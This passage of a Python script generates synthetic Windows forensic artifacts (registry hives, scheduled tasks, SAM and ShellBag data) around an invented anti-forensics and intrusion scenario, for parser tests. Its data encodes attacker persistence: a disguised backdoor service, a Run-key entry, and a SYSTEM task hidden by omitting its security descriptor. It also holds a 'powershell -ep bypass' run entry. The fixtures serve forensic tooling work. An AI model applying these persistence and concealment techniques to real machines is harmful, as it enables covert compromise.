#!/usr/bin/env python3
"""Synthetic Windows artifacts with known answers, for Kokino's parsers.

Everything here is invented: the computer is LAB-PC, the user alice, IP
addresses come from the documentation ranges (203.0.113.0/24, 10.0.0.0/8)
and domains end in .test. The story matches the browser fixture: alice
researches wiping tools, plugs in a USB stick, opens a document from it,
runs SDelete three times and clears the Security log; the next night an
RDP logon from 203.0.113.50 follows five failed passwords, a backdoor
service and an admin account are added.

build() returns {relative path on the volume: bytes}. Writers:
  regf hives (SYSTEM, SOFTWARE, SAM, NTUSER.DAT, UsrClass.dat, Amcache.hve)
  EVTX logs with template-based binary XML and valid CRCs
  Prefetch v30 (MAM / LZXPRESS Huffman compressed when run on Windows)
  LNK shortcuts, Jump Lists (OLE compound file + DestList, custom)

Run directly to write tests/fixtures/win/ (single files for parser tests,
plus LZXPRESS Huffman vectors made by Windows' own compressor).
"""

import ctypes
import os
import struct
import sys
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
OUT = os.path.join(HERE, "..", "tests", "fixtures", "win")

UNIX_FT = 116444736000000000


def ft(y, mo, d, h=0, mi=0, s=0):
    import calendar
    return calendar.timegm((y, mo, d, h, mi, s)) * 10_000_000 + UNIX_FT


def u16s(s, nul=True):
    return (s + ("\0" if nul else "")).encode("utf-16-le")


def systemtime(y, mo, d, h=0, mi=0, s=0):
    import datetime
    dow = (datetime.date(y, mo, d).weekday() + 1) % 7
    return struct.pack("<8H", y, mo, dow, d, h, mi, s, 0)


SID_ALICE = "S-1-5-21-1111111111-2222222222-3333333333-1001"
SID_SVC = "S-1-5-21-1111111111-2222222222-3333333333-1002"


def sid_bytes(s):
    p = s.split("-")
    subs = [int(x) for x in p[3:]]
    return bytes([int(p[1]), len(subs)]) + int(p[2]).to_bytes(6, "big") + b"".join(struct.pack("<I", x) for x in subs)


# --------------------------------------------------------------- registry

REG_SZ, REG_EXPAND_SZ, REG_BINARY, REG_DWORD, REG_MULTI_SZ, REG_QWORD = 1, 2, 3, 4, 7, 11


class Key:
    def __init__(self, name, values=(), subkeys=(), ts=0):
        self.name, self.values, self.subkeys, self.ts = name, list(values), list(subkeys), ts


def sz(name, s):
    return (name, REG_SZ, u16s(s))


def dword(name, v):
    return (name, REG_DWORD, struct.pack("<I", v & 0xFFFFFFFF))


def qword(name, v):
    return (name, REG_QWORD, struct.pack("<Q", v))


def binary(name, b):
    return (name, REG_BINARY, bytes(b))


def multi(name, items):
    return (name, REG_MULTI_SZ, b"".join(u16s(x) for x in items) + b"\0\0")


def path_key(path, leaf_values=(), ts=0, subkeys=()):
    """Nested keys from 'A\\B\\C' with values on the last one."""
    parts = path.split("\\")
    k = Key(parts[-1], leaf_values, subkeys, ts)
    for p in reversed(parts[:-1]):
        k = Key(p, [], [k], ts)
    return k


def merge(keys):
    """Merges keys with the same name (so path_key results can be combined)."""
    out = {}
    order = []
    for k in keys:
        if k.name.lower() in out:
            m = out[k.name.lower()]
            m.values += k.values
            m.subkeys = merge(m.subkeys + k.subkeys)
            m.ts = max(m.ts, k.ts)
        else:
            out[k.name.lower()] = Key(k.name, list(k.values), merge(k.subkeys), k.ts)
            order.append(k.name.lower())
    return [out[n] for n in order]


def lh_hash(name):
    h = 0
    for c in name.upper():
        h = (h * 37 + ord(c)) & 0xFFFFFFFF
    return h


def write_hive(root, embedded_name, deleted=(), orphans=()):
    """deleted: (parent path, Key) subtrees written and then freed, as Windows
    leaves a deleted key; orphans: (name, kind, data) values freed the same way."""
    cells = bytearray()
    offsets = {}

    def cell(body):
        off = 32 + len(cells)
        size = (len(body) + 4 + 7) // 8 * 8
        cells.extend(struct.pack("<i", -size) + body + b"\0" * (size - 4 - len(body)))
        return off

    def value(name, kind, data):
        nb = name.encode("ascii")
        if len(data) <= 4:
            size, doff = len(data) | 0x80000000, int.from_bytes(data.ljust(4, b"\0"), "little")
        else:
            size, doff = len(data), cell(data)
        return cell(b"vk" + struct.pack("<HIIIHH", len(nb), size, doff, kind, 1 if nb else 0, 0) + nb)

    def key(k, parent, path=""):
        # children first so their offsets are known; parent offsets patched after
        nb = k.name.encode("ascii")
        nk_off = cell(b"\0" * (76 + len(nb)))  # placeholder, rewritten below
        offsets[path.lower()] = nk_off
        subs = [key(s, nk_off, (path + "\\" + s.name).lstrip("\\")) for s in k.subkeys]
        sl = 0xFFFFFFFF
        if subs:
            body = b"lh" + struct.pack("<H", len(subs))
            for s, so in sorted(zip(k.subkeys, subs), key=lambda x: x[0].name.upper()):
                body += struct.pack("<II", so, lh_hash(s.name))
            sl = cell(body)
        vl = 0xFFFFFFFF
        if k.values:
            vl = cell(b"".join(struct.pack("<I", value(*v)) for v in k.values))
        nk = bytearray(b"nk")
        nk += struct.pack("<HQIIIIIIIIIII", 0x20 | (0x04 if parent is None else 0), k.ts, 0, parent or 0, len(subs), 0, sl, 0xFFFFFFFF, len(k.values), vl, 0xFFFFFFFF, 0xFFFFFFFF, 0)
        nk += b"\0" * (72 - len(nk))
        nk += struct.pack("<HH", len(nb), 0) + nb
        p = nk_off - 32 + 4
        cells[p:p + len(nk)] = nk
        return nk_off

    root_off = key(root, None)
    # Deleted keys and values: written like live ones, then their cells freed.
    start = len(cells)
    for parent, k in deleted:
        key(k, offsets[parent.lower()], "deleted:" + parent)
    for v in orphans:
        value(*v)
    p = start
    while p < len(cells):
        sz = -struct.unpack_from("<i", cells, p)[0]
        struct.pack_into("<i", cells, p, sz)
        p += sz
    size = (32 + len(cells) + 4095) // 4096 * 4096
    hbin = bytearray(size)
    hbin[0:4] = b"hbin"
    struct.pack_into("<II", hbin, 4, 0, size)
    hbin[32:32 + len(cells)] = cells
    if size > 32 + len(cells):  # rest of the bin is one free cell
        struct.pack_into("<i", hbin, 32 + len(cells), size - 32 - len(cells))
    base = bytearray(4096)
    base[0:4] = b"regf"
    struct.pack_into("<IIQIIIIIII", base, 4, 1, 1, root.ts, 1, 5, 0, 1, root_off, size, 1)
    name = embedded_name.encode("utf-16-le")[:64]
    base[48:48 + len(name)] = name
    x = 0
    for i in range(127):
        x ^= struct.unpack_from("<I", base, 4 * i)[0]
    struct.pack_into("<I", base, 508, x)
    return bytes(base) + bytes(hbin)


def rot13(s):
    out = []
    for c in s:
        if "a" <= c <= "z":
            out.append(chr((ord(c) - 97 + 13) % 26 + 97))
        elif "A" <= c <= "Z":
            out.append(chr((ord(c) - 65 + 13) % 26 + 65))
        else:
            out.append(c)
    return "".join(out)


def userassist(count, last, focus_ms=60_000):
    b = bytearray(72)
    struct.pack_into("<IIII", b, 0, 0, count, count, focus_ms)
    struct.pack_into("<Q", b, 60, last)
    return bytes(b)


def mru_ex(order):
    return b"".join(struct.pack("<I", i) for i in order) + b"\xff\xff\xff\xff"


def shimcache(entries):
    """Windows 10 AppCompatCache: 0x34-byte header, then '10ts' entries."""
    out = bytearray(struct.pack("<I", 0x34) + b"\0" * 0x30)
    for path, modified in entries:
        p = path.encode("utf-16-le")
        body = struct.pack("<H", len(p)) + p + struct.pack("<QI", modified, 0)
        out += b"10ts" + struct.pack("<II", 0, len(body)) + body
    return bytes(out)


USB_PROPS = "{83da6326-97a6-4088-9453-a1923f573b29}"


def usb_device(vendor, product, rev, serial, friendly, first, last, removed):
    props = Key("Properties", [], [Key(USB_PROPS, [], [
        Key("0064", [binary("", struct.pack("<Q", first))], ts=first),
        Key("0066", [binary("", struct.pack("<Q", last))], ts=last),
        Key("0067", [binary("", struct.pack("<Q", removed))], ts=removed),
    ])])
    inst = Key(serial, [sz("FriendlyName", friendly), sz("DeviceDesc", "Disk drive")], [props], ts=last)
    return Key("Disk&Ven_%s&Prod_%s&Rev_%s" % (vendor, product, rev), [], [inst], ts=last)


def hive_system():
    cs = "ControlSet001"
    keys = [
        path_key("Select", [dword("Current", 1), dword("Default", 1), dword("LastKnownGood", 1)]),
        path_key(cs + "\\Control\\ComputerName\\ComputerName", [sz("ComputerName", "LAB-PC")]),
        path_key(cs + "\\Control\\TimeZoneInformation", [sz("TimeZoneKeyName", "Central Europe Standard Time"), dword("Bias", -60), dword("ActiveTimeBias", -120)]),
        path_key(cs + "\\Control\\Windows", [binary("ShutdownTime", struct.pack("<Q", ft(2026, 10, 21, 18, 5)))]),
        path_key(cs + "\\Control\\Session Manager\\AppCompatCache", [binary("AppCompatCache", shimcache([
            ("C:\\Users\\alice\\sdelete64.exe", ft(2026, 10, 20, 9, 41)),
            ("C:\\Program Files\\VeraCrypt\\VeraCrypt.exe", ft(2026, 10, 19, 10, 2)),
            ("C:\\Users\\Public\\updsvc.exe", ft(2026, 10, 21, 2, 11)),
            ("C:\\Windows\\System32\\cmd.exe", ft(2025, 3, 2, 8, 0)),
        ]))]),
        path_key(cs + "\\Enum\\USBSTOR", [], subkeys=[
            usb_device("SanDisk", "Cruzer_Blade", "1.00", "4C530001231109115023&0", "SanDisk Cruzer Blade USB Device", ft(2026, 10, 20, 9, 45), ft(2026, 10, 20, 9, 45), ft(2026, 10, 20, 11, 2)),
            usb_device("Kingston", "DataTraveler_3.0", "PMAP", "E0D55EA574E5B571C9A80E3F&0", "Kingston DataTraveler 3.0 USB Device", ft(2026, 9, 2, 14, 0), ft(2026, 10, 18, 16, 30), ft(2026, 10, 18, 17, 10)),
        ]),
        path_key(cs + "\\Services\\Tcpip\\Parameters\\Interfaces\\{6F1D3A1C-2B6E-4C8A-9A51-0D7C2E4B8F10}", [
            dword("EnableDHCP", 1), sz("DhcpIPAddress", "10.0.0.23"), sz("DhcpServer", "10.0.0.1"), sz("DhcpDomain", "lab.test"), multi("DhcpDefaultGateway", ["10.0.0.1"]), sz("DhcpSubnetMask", "255.255.255.0"),
        ]),
        path_key(cs + "\\Services\\updsvc", [sz("ImagePath", "C:\\Users\\Public\\updsvc.exe -k netsvc"), dword("Start", 2), dword("Type", 16), sz("DisplayName", "Windows Update Helper"), sz("ObjectName", "LocalSystem")], ts=ft(2026, 10, 21, 2, 14)),
        path_key(cs + "\\Services\\Tcpip", [sz("ImagePath", "System32\\drivers\\tcpip.sys"), dword("Start", 0), dword("Type", 1)]),
        path_key(cs + "\\Services\\Spooler", [sz("ImagePath", "%SystemRoot%\\System32\\spoolsv.exe"), dword("Start", 2), dword("Type", 16)]),
        # BAM (Windows 10 1809+): last run per program for alice; one for DAM.
        path_key(cs + "\\Services\\bam\\State\\UserSettings\\" + SID_ALICE, [
            binary("\\Device\\HarddiskVolume3\\Users\\alice\\sdelete64.exe", struct.pack("<QQQ", ft(2026, 10, 20, 9, 41, 30), 0, 2)),
            binary("\\Device\\HarddiskVolume3\\Program Files\\VeraCrypt\\VeraCrypt.exe", struct.pack("<QQQ", ft(2026, 10, 20, 10, 50, 5), 0, 2)),
            binary("Microsoft.Windows.Explorer", struct.pack("<QQQ", ft(2026, 10, 21, 2, 8), 0, 0)),
            dword("Version", 1), dword("SequenceNumber", 412),
        ], ts=ft(2026, 10, 21, 2, 8)),
        path_key(cs + "\\Services\\dam\\State\\UserSettings\\" + SID_ALICE, [
            binary("\\Device\\HarddiskVolume3\\Windows\\System32\\notepad.exe", struct.pack("<QQ", ft(2026, 10, 19, 17, 30), 0)),
        ]),
        path_key("MountedDevices", [binary("\\DosDevices\\E:", u16s("\\??\\USBSTOR#Disk&Ven_SanDisk&Prod_Cruzer_Blade&Rev_1.00#4C530001231109115023&0#{53f56307-b6bf-11d0-94f2-00a0c91efb8b}", False))]),
    ]
    return write_hive(Key("ROOT", [], merge(keys), ts=ft(2026, 10, 21, 18, 5)), "\\??\\C:\\Windows\\System32\\config\\SYSTEM")


WLAN_IF = "{6F1D3A1C-2B6E-4C8A-9A51-0D7C2E4B8F10}"
WLAN_PROFILE = "{3C9A6E21-7B44-4D0E-9F12-6A5B8C7D0E11}"


def wlan_profile_xml():
    return ('<?xml version="1.0"?>\n<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">\n'
            '\t<name>LabWiFi</name>\n\t<SSIDConfig><SSID><name>LabWiFi</name></SSID></SSIDConfig>\n'
            '\t<connectionType>ESS</connectionType>\n</WLANProfile>\n').encode()


# Scheduled tasks (task files and TaskCache). Ground truth:
#   \Microsoft\Windows\Defrag\ScheduledDefrag  Windows' own, registered normally
#   \Updater Check     C:\Users\Public\updsvc.exe -silent at alice's logon and every
#                      5 min; created 2026-10-21 02:16:40, last ran 09:00:05 (UTC)
#   \Microsoft\Windows\WinUpdate\Sync  C:\ProgramData\winupd\svch.exe as SYSTEM,
#                      hidden: its Tree key has no SD value (Tarrask); created 02:18:10
#   \OneDrive Cleanup  registered (Actions blob only), but its task file is gone
TASKS = [
    # path, id, sd, created, last run, (command, arguments), user, author, trigger xml, file?
    ("Microsoft\\Windows\\Defrag\\ScheduledDefrag", "{1D9E2E56-6B40-4C9C-9D38-0B6D1F0A0001}", True, (2025, 3, 2, 8, 5, 0), (2026, 10, 18, 3, 0, 0),
     ("%windir%\\system32\\defrag.exe", "-c -h -o -$"), "S-1-5-18", "Microsoft Corporation",
     "<CalendarTrigger><StartBoundary>2025-01-01T01:00:00</StartBoundary><ScheduleByWeek><WeeksInterval>1</WeeksInterval></ScheduleByWeek></CalendarTrigger>", True),
    ("Updater Check", "{1D9E2E56-6B40-4C9C-9D38-0B6D1F0A0002}", True, (2026, 10, 21, 2, 16, 40), (2026, 10, 21, 9, 0, 5),
     ("C:\\Users\\Public\\updsvc.exe", "-silent"), SID_ALICE, "LAB-PC\\alice",
     "<LogonTrigger><UserId>LAB-PC\\alice</UserId></LogonTrigger><TimeTrigger><Repetition><Interval>PT5M</Interval></Repetition><StartBoundary>2026-10-21T04:20:00</StartBoundary></TimeTrigger>", True),
    ("Microsoft\\Windows\\WinUpdate\\Sync", "{1D9E2E56-6B40-4C9C-9D38-0B6D1F0A0003}", False, (2026, 10, 21, 2, 18, 10), (2026, 10, 21, 8, 0, 0),
     ("C:\\ProgramData\\winupd\\svch.exe", ""), "S-1-5-18", "LAB-PC\\alice",
     "<BootTrigger/><CalendarTrigger><StartBoundary>2026-10-21T04:00:00</StartBoundary><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger>", True),
    ("OneDrive Cleanup", "{1D9E2E56-6B40-4C9C-9D38-0B6D1F0A0004}", True, (2026, 10, 21, 2, 19, 0), (0, 0, 0, 0, 0, 0),
     ("C:\\Users\\alice\\AppData\\Local\\Temp\\clean.cmd", ""), SID_ALICE, "LAB-PC\\alice", "<LogonTrigger/>", False),
]


def task_xml(path, cmd, user, author, triggers, created):
    y, mo, d, h, mi, s = created
    esc = lambda t: t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
    args = "<Arguments>%s</Arguments>" % esc(cmd[1]) if cmd[1] else ""
    x = ('<?xml version="1.0" encoding="UTF-16"?>\r\n<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">\r\n'
         '  <RegistrationInfo>\r\n    <Date>%04d-%02d-%02dT%02d:%02d:%02d</Date>\r\n    <Author>%s</Author>\r\n    <URI>\\%s</URI>\r\n  </RegistrationInfo>\r\n'
         '  <Triggers>%s</Triggers>\r\n'
         '  <Principals>\r\n    <Principal id="Author">\r\n      <UserId>%s</UserId>\r\n      <RunLevel>HighestAvailable</RunLevel>\r\n    </Principal>\r\n  </Principals>\r\n'
         '  <Settings>\r\n    <Enabled>true</Enabled>\r\n    <Hidden>false</Hidden>\r\n  </Settings>\r\n'
         '  <Actions Context="Author">\r\n    <Exec>\r\n      <Command>%s</Command>\r\n      %s\r\n    </Exec>\r\n  </Actions>\r\n</Task>\r\n'
         % (y, mo, d, h, mi, s, esc(author), esc(path), triggers, user, esc(cmd[0]), args))
    return b"\xff\xfe" + x.encode("utf-16-le")


def task_files():
    return {"Windows/System32/Tasks/" + p.replace("\\", "/"): task_xml(p, cmd, user, author, trig, created)
            for p, _id, _sd, created, _last, cmd, user, author, trig, has_file in TASKS if has_file}


def actions_blob(context, cmd, args):
    s = lambda t: struct.pack("<I", len(t) * 2) + t.encode("utf-16-le")
    return struct.pack("<H", 3) + s(context) + struct.pack("<H", 0x6666) + s("") + s(cmd) + s(args) + s("") + b"\0\0"


def task_cache_keys():
    keys = []
    base = "Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache"
    for path, tid, sd, created, last, cmd, user, author, _trig, _f in TASKS:
        tree = [sz("Id", tid), dword("Index", 3)]
        if sd:
            tree.append(binary("SD", bytes.fromhex("010004801400000020000000000000002c000000")))
        keys.append(path_key(base + "\\Tree\\" + path, tree, ts=ft(*created)))
        dyn = struct.pack("<IQQIIQ", 3, ft(*created), ft(*last) if last[0] else 0, 0, 0, ft(*last) if last[0] else 0)
        keys.append(path_key(base + "\\Tasks\\" + tid, [sz("Path", "\\" + path), sz("Author", author), sz("Date", "%04d-%02d-%02dT%02d:%02d:%02d" % created),
                                                         binary("Actions", actions_blob(user, cmd[0], cmd[1])), binary("DynamicInfo", dyn)], ts=ft(*created)))
    return keys


def hive_software():
    nt = "Microsoft\\Windows NT\\CurrentVersion"
    unin = "Microsoft\\Windows\\CurrentVersion\\Uninstall"
    keys = [
        path_key(nt, [sz("ProductName", "Windows 10 Pro"), sz("DisplayVersion", "22H2"), sz("CurrentBuild", "19045"), dword("UBR", 4170), sz("EditionID", "Professional"),
                      dword("InstallDate", 1740902400), qword("InstallTime", ft(2025, 3, 2, 8, 0)), sz("RegisteredOwner", "alice"), sz("RegisteredOrganization", ""), sz("SystemRoot", "C:\\Windows")]),
        path_key(nt + "\\ProfileList\\S-1-5-18", [sz("ProfileImagePath", "%systemroot%\\system32\\config\\systemprofile")]),
        path_key(nt + "\\ProfileList\\" + SID_ALICE, [sz("ProfileImagePath", "C:\\Users\\alice")], ts=ft(2025, 3, 2, 8, 10)),
        path_key(nt + "\\ProfileList\\" + SID_SVC, [sz("ProfileImagePath", "C:\\Users\\svc_backup")], ts=ft(2026, 10, 21, 2, 20)),
        # Wi-Fi profile index 7 (SRUM's L2ProfileId); its name is in the XML file.
        path_key("Microsoft\\WlanSvc\\Interfaces\\" + WLAN_IF + "\\Profiles\\" + WLAN_PROFILE, [dword("ProfileIndex", 7), dword("Flags", 0)]),
        path_key(nt + "\\NetworkList\\Profiles\\{A1B2C3D4-0000-4000-8000-000000000001}", [sz("ProfileName", "LabWiFi"), sz("Description", "LabWiFi"), dword("Category", 1), dword("NameType", 0x47),
                 binary("DateCreated", systemtime(2025, 3, 2, 9, 0)), binary("DateLastConnected", systemtime(2026, 10, 21, 8, 0))]),
        path_key(nt + "\\NetworkList\\Profiles\\{A1B2C3D4-0000-4000-8000-000000000002}", [sz("ProfileName", "Airport-Guest"), sz("Description", "Airport-Guest"), dword("Category", 0), dword("NameType", 0x47),
                 binary("DateCreated", systemtime(2026, 10, 19, 6, 40)), binary("DateLastConnected", systemtime(2026, 10, 19, 7, 15))]),
        path_key(nt + "\\NetworkList\\Signatures\\Unmanaged\\0102030405060708090A0B0C0D0E0F10", [sz("ProfileGuid", "{A1B2C3D4-0000-4000-8000-000000000001}"), sz("Description", "LabWiFi"),
                 binary("DefaultGatewayMac", bytes.fromhex("02005e10aa01")), sz("DnsSuffix", "lab.test"), sz("FirstNetwork", "LabWiFi")]),
        path_key(unin + "\\VeraCrypt", [sz("DisplayName", "VeraCrypt"), sz("DisplayVersion", "1.26.7"), sz("Publisher", "IDRIX"), sz("InstallDate", "20261019"), sz("InstallLocation", "C:\\Program Files\\VeraCrypt\\")], ts=ft(2026, 10, 19, 10, 0)),
        path_key(unin + "\\7-Zip", [sz("DisplayName", "7-Zip 23.01 (x64)"), sz("DisplayVersion", "23.01"), sz("Publisher", "Igor Pavlov"), sz("InstallLocation", "C:\\Program Files\\7-Zip\\")], ts=ft(2025, 4, 1, 12, 0)),
        path_key("WOW6432Node\\" + unin + "\\CCleaner", [sz("DisplayName", "CCleaner"), sz("DisplayVersion", "6.20"), sz("Publisher", "Piriform"), sz("InstallDate", "20261020")], ts=ft(2026, 10, 20, 10, 40)),
        path_key("Microsoft\\Windows\\CurrentVersion\\Run", [sz("SecurityHealth", "%windir%\\system32\\SecurityHealthSystray.exe"), sz("Updater", "C:\\Users\\Public\\updsvc.exe -silent")], ts=ft(2026, 10, 21, 2, 15)),
    ] + task_cache_keys()
    return write_hive(Key("ROOT", [], merge(keys), ts=ft(2026, 10, 21, 2, 15)), "\\??\\C:\\Windows\\System32\\config\\SOFTWARE")


def sam_f(rid, last_logon, pw_set, failed_at, flags, failed, logons):
    b = bytearray(80)
    struct.pack_into("<Q", b, 8, last_logon)
    struct.pack_into("<Q", b, 24, pw_set)
    struct.pack_into("<Q", b, 32, 0x7FFFFFFFFFFFFFFF)
    struct.pack_into("<Q", b, 40, failed_at)
    struct.pack_into("<I", b, 48, rid)
    struct.pack_into("<H", b, 56, flags)
    struct.pack_into("<HH", b, 64, failed, logons)
    return bytes(b)


def hive_sam():
    users = "SAM\\Domains\\Account\\Users"
    keys = [
        path_key(users + "\\Names\\Administrator", [("", 0x1F4, b"")], ts=ft(2025, 3, 2, 8, 0)),
        path_key(users + "\\Names\\Guest", [("", 0x1F5, b"")], ts=ft(2025, 3, 2, 8, 0)),
        path_key(users + "\\Names\\alice", [("", 0x3E9, b"")], ts=ft(2025, 3, 2, 8, 9)),
        path_key(users + "\\Names\\svc_backup", [("", 0x3EA, b"")], ts=ft(2026, 10, 21, 2, 20)),
        path_key(users + "\\000001F4", [binary("F", sam_f(500, 0, ft(2025, 3, 2, 8, 0), 0, 0x0211, 0, 0))]),
        path_key(users + "\\000001F5", [binary("F", sam_f(501, 0, 0, 0, 0x0215, 0, 0))]),
        path_key(users + "\\000003E9", [binary("F", sam_f(1001, ft(2026, 10, 21, 2, 5), ft(2025, 3, 2, 8, 9), ft(2026, 10, 21, 2, 4), 0x0210, 0, 214))]),
        path_key(users + "\\000003EA", [binary("F", sam_f(1002, ft(2026, 10, 21, 2, 25), ft(2026, 10, 21, 2, 20), 0, 0x0210, 0, 1))]),
    ]
    return write_hive(Key("ROOT", [], merge(keys), ts=ft(2026, 10, 21, 2, 25)), "\\??\\C:\\Windows\\System32\\config\\SAM")


def recentdocs_value(name):
    # name, NUL, then (truncated) shell item data
    return u16s(name) + b"\x14\x00\x32\x00" + b"\0" * 16


def hive_ntuser():
    exp = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer"
    ua = exp + "\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count"
    keys = [
        path_key(ua, [
            binary(rot13("C:\\Users\\alice\\sdelete64.exe"), userassist(3, ft(2026, 10, 20, 10, 20))),
            binary(rot13("{6D809377-6AF0-444B-8957-A3773F02200E}\\VeraCrypt\\VeraCrypt.exe"), userassist(2, ft(2026, 10, 20, 10, 50))),
            binary(rot13("{1AC14E77-02E7-4E5D-B744-2EB1AE5198B7}\\cmd.exe"), userassist(9, ft(2026, 10, 21, 2, 9))),
            binary(rot13("UEME_CTLSESSION"), b"\0" * 16),
        ], ts=ft(2026, 10, 21, 2, 9)),
        path_key(exp + "\\RecentDocs", [binary("0", recentdocs_value("nightjar.docx")), binary("1", recentdocs_value("keys.txt")), binary("MRUListEx", mru_ex([1, 0]))], ts=ft(2026, 10, 20, 9, 52)),
        path_key(exp + "\\RecentDocs\\.docx", [binary("0", recentdocs_value("nightjar.docx")), binary("MRUListEx", mru_ex([0]))], ts=ft(2026, 10, 20, 9, 47)),
        path_key(exp + "\\TypedPaths", [sz("url1", "E:\\Projects"), sz("url2", "\\\\fileserver.lab.test\\finance")], ts=ft(2026, 10, 20, 9, 46)),
        path_key(exp + "\\RunMRU", [sz("a", "cmd\\1"), sz("b", "powershell -ep bypass\\1"), sz("MRUList", "ba")], ts=ft(2026, 10, 21, 2, 8)),
        path_key(exp + "\\WordWheelQuery", [binary("0", u16s("password")), binary("1", u16s("nightjar")), binary("MRUListEx", mru_ex([1, 0]))], ts=ft(2026, 10, 20, 9, 50)),
        path_key("Software\\Microsoft\\Windows\\CurrentVersion\\Run", [sz("OneDrive", "\"C:\\Users\\alice\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe\" /background")], ts=ft(2025, 3, 2, 8, 20)),
    ]
    # Deleted (REG_DELETED below is the ground truth for the tests): typed
    # addresses removed with their parent key, the SDelete EULA key with its
    # parent, and an older copy of RunMRU that still has an entry removed
    # since. UsrClass.dat holds a deleted value on its own.
    deleted = [
        ("Software\\Microsoft", Key("Internet Explorer", [], [Key("TypedURLs", [sz("url1", "http://drop.test/")], [], ft(2026, 10, 21, 2, 11))], ft(2026, 10, 21, 2, 11))),
        ("Software", Key("Sysinternals", [], [Key("SDelete", [dword("EulaAccepted", 1)], [], ft(2026, 10, 20, 10, 19))], ft(2026, 10, 20, 10, 19))),
        (exp, Key("RunMRU", [sz("c", "sdelete64 plan.docx\\1")], [], ft(2026, 10, 21, 2, 7))),
    ]
    return write_hive(Key("ROOT", [], merge(keys), ts=ft(2026, 10, 21, 2, 9)), "\\??\\C:\\Users\\alice\\ntuser.dat", deleted)


def fat_dt(y, mo, d, h=0, mi=0, s=0):
    """FAT date then time, as shell items store them."""
    return struct.pack("<HH", ((y - 1980) << 9) | (mo << 5) | d, (h << 11) | (mi << 5) | (s // 2))


def shell_folder(short, long, mft, modified, created):
    """Folder file-entry shell item with a version 9 0xBEEF0004 block
    (long name, created and accessed times, MFT reference)."""
    f = bytearray(b"\0\0\x31\0" + b"\0" * 4) + fat_dt(*modified) + struct.pack("<H", 0x10) + short.encode() + b"\0"
    if len(f) % 2:
        f += b"\0"
    ext = bytearray(0x2E)
    struct.pack_into("<HI", ext, 2, 9, 0xBEEF0004)
    ext[8:12] = fat_dt(*created)
    ext[12:16] = fat_dt(*modified)
    struct.pack_into("<HHQ", ext, 16, 0x2E, 0, mft[0] | mft[1] << 48)
    ext += u16s(long) + struct.pack("<H", 0x14)
    struct.pack_into("<H", ext, 0, len(ext))
    f += ext
    struct.pack_into("<H", f, 0, len(f))
    return bytes(f) + b"\0\0"


def shell_drive(letter):
    d = bytearray(0x19)
    d[2] = 0x2F
    d[3:6] = (letter + ":\\").encode()
    struct.pack_into("<H", d, 0, len(d))
    return bytes(d) + b"\0\0"


def shell_root(guid_bytes):
    return struct.pack("<HBB", 20, 0x1F, 0x50) + guid_bytes + b"\0\0"


def shell_network(location):
    b = bytearray(b"\0\0\x41\x01\x00") + location.encode() + b"\0\0\0"
    struct.pack_into("<H", b, 0, len(b))
    return bytes(b) + b"\0\0"


THIS_PC = bytes([0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10, 0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D])


def hive_usrclass():
    """ShellBags: This PC > C: > Users > alice > Documents, the USB stick E:
    with two folders (Nightjar leak opened last), and a network share."""
    b = "Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU"
    keys = [
        path_key(b, [binary("0", shell_root(THIS_PC)), binary("1", shell_network("\\\\fileserver.lab.test\\finance")), binary("MRUListEx", mru_ex([1, 0])), dword("NodeSlots", 2)], ts=ft(2026, 10, 20, 9, 46)),
        path_key(b + "\\0", [binary("0", shell_drive("C")), binary("1", shell_drive("E")), binary("MRUListEx", mru_ex([1, 0])), dword("NodeSlot", 3)], ts=ft(2026, 10, 20, 9, 45)),
        path_key(b + "\\0\\0", [binary("0", shell_folder("Users", "Users", (64, 1), (2025, 3, 2, 7, 55), (2025, 3, 2, 7, 50))), binary("MRUListEx", mru_ex([0]))], ts=ft(2026, 10, 19, 18, 0)),
        path_key(b + "\\0\\0\\0", [binary("0", shell_folder("alice", "alice", (70, 2), (2026, 10, 19, 17, 0), (2025, 3, 2, 8, 0))), binary("MRUListEx", mru_ex([0]))], ts=ft(2026, 10, 19, 18, 1)),
        path_key(b + "\\0\\0\\0\\0", [binary("0", shell_folder("DOCUME~1", "Documents", (80, 2), (2026, 10, 19, 17, 30), (2025, 3, 2, 8, 0))), binary("MRUListEx", mru_ex([0]))], ts=ft(2026, 10, 19, 18, 2)),
        path_key(b + "\\0\\1", [binary("0", shell_folder("PROJEC~1", "Projects 2026", (39, 1), (2026, 10, 1, 12, 0), (2026, 9, 30, 10, 0))), binary("1", shell_folder("NIGHTJ~1", "Nightjar leak", (41, 1), (2026, 10, 20, 9, 40), (2026, 10, 20, 9, 40))), binary("MRUListEx", mru_ex([1, 0]))], ts=ft(2026, 10, 20, 9, 47)),
        path_key(b + "\\1", [binary("0", shell_folder("Q3", "Q3", (0, 0), (2026, 10, 18, 11, 0), (2026, 7, 1, 9, 0))), binary("MRUListEx", mru_ex([0]))], ts=ft(2026, 10, 20, 9, 46)),
    ]
    return write_hive(Key("ROOT", [], merge(keys), ts=ft(2026, 10, 20, 9, 47)), "\\??\\C:\\Users\\alice\\AppData\\Local\\Microsoft\\Windows\\UsrClass.dat", orphans=[sz("LastFile", "C:\\Users\\alice\\Desktop\\keys.txt")])


def hive_amcache():
    inv = "Root\\InventoryApplicationFile"
    keys = [
        path_key(inv + "\\sdelete64.exe|a1b2c3d4e5f60718", [sz("LowerCaseLongPath", "c:\\users\\alice\\sdelete64.exe"), sz("Name", "sdelete64.exe"), sz("FileId", "0000" + "3f2a9c7d1e5b8a6f4c3d2e1f0a9b8c7d6e5f4a3b"),
                 sz("Publisher", "sysinternals - www.sysinternals.com"), sz("Version", "2.05"), sz("LinkDate", "06/12/2023 18:04:33"), qword("Size", 529_008)], ts=ft(2026, 10, 20, 10, 5)),
        path_key(inv + "\\veracrypt.exe|0f1e2d3c4b5a6978", [sz("LowerCaseLongPath", "c:\\program files\\veracrypt\\veracrypt.exe"), sz("Name", "VeraCrypt.exe"), sz("FileId", "0000" + "9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2f1a0b"),
